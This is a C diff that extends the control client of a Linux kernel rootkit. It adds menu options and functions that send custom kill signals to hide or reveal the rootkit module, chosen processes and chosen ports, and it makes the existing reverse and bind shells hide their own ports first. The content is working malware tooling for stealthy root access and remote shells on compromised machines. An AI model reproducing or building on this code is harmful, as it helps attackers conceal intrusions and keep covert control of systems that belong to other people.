@@ -29,6 +29,24 @@ void send_signals(void)
     // Hide process
     printf("Sending signal SIGHIDE...\n");
     syscall(SYS_kill, PID_SELF, SIGHIDE);
+
+    // Authorize process
+    printf("Sending signal SIGAUTH...\n");
+    syscall(SYS_kill, PID_SELF, SIGAUTH);
+}
+
+int hide_port(uint16_t ui16_port)
+{
+    printf("Hiding port %hu...\n", ui16_port);
+
+    return syscall(SYS_kill, ui16_port, SIGPORTHIDE);
+}
+
+int show_port(uint16_t ui16_port)
+{
+    printf("Showing port %hu...\n", ui16_port);
+
+    return syscall(SYS_kill, ui16_port, SIGPORTSHOW);
 }
 
 void print_options(void)
@@ -39,6 +57,13 @@ void print_options(void)
     printf("  1: Root shell\n");
     printf("  2: Reverse shell\n");
     printf("  3: Bind shell\n");
+    printf("  4: Show rootkit\n");
+    printf("  5: Hide rootkit\n");
+    printf("  6: Show process\n");
+    printf("  7: Hide process\n");
+    printf("  8: Show port\n");
+    printf("  9: Hide port\n");
+    putchar('\n');
     printf("  q: Exit\n");
 }
 
@@ -65,6 +90,8 @@ int reverse_shell(void)
     int i32_sockfd           = 0;
     int i32_ret              = 0;
     struct sockaddr_in sa_in = { 0 };
+
+    hide_port(REMOTE_PORT);
 
     printf("Spawning reverse shell to %s:%hu...\n", REMOTE_ADDR, REMOTE_PORT);
 
@@ -99,6 +126,8 @@ int bind_shell(void)
     int i32_sockfd           = 0;
     int i32_ret              = 0;
     struct sockaddr_in sa_in = { 0 };
+
+    hide_port(LOCAL_PORT);
 
     printf("Spawning bind shell on port %hu...\n", LOCAL_PORT);
 
@@ -140,6 +169,54 @@ int bind_shell(void)
     return i32_ret;
 }
 
+int show_rootkit(void)
+{
+    printf("Showing rootkit...\n");
+    return syscall(SYS_kill, PID_SECRET, SIGMODSHOW);
+}
+
+int hide_rootkit(void)
+{
+    printf("Hiding rootkit...\n");
+    return syscall(SYS_kill, PID_SECRET, SIGMODHIDE);
+}
+
+int hide_process(pid_t i32_pid)
+{
+    printf("Hiding process %d...\n", i32_pid);
+    return syscall(SYS_kill, i32_pid, SIGHIDE);
+}
+
+int show_process(pid_t i32_pid)
+{
+    printf("Showing process %d...\n", i32_pid);
+    return syscall(SYS_kill, i32_pid, SIGSHOW);
+}
+
+pid_t get_pid(void)
+{
+    pid_t i32_pid = 0;
+
+    printf("Enter PID: ");
+    scanf("%d", &i32_pid);
+    while (getchar() != '\n')
+        ;
+
+    return i32_pid;
+}
+
+uint16_t get_port(void)
+{
+    uint16_t ui16_port = 0;
+
+    printf("Enter port: ");
+    scanf("%hu", &ui16_port);
+    while (getchar() != '\n')
+        ;
+
+    return ui16_port;
+}
+
 int main(void)
 {
     char c_input = 0;
@@ -161,6 +238,25 @@ int main(void)
         case '3':
             bind_shell();
             break;
+        case '4':
+            show_rootkit();
+            break;
+        case '5':
+            hide_rootkit();
+            break;
+        case '6':
+            show_process(get_pid());
+            break;
+        case '7':
+            hide_process(get_pid());
+            break;
+        case '8':
+            show_port(get_port());
+            break;
+        case '9':
+            hide_port(get_port());
+            break;
+
         default:
             printf("Invalid option\n");
             break;
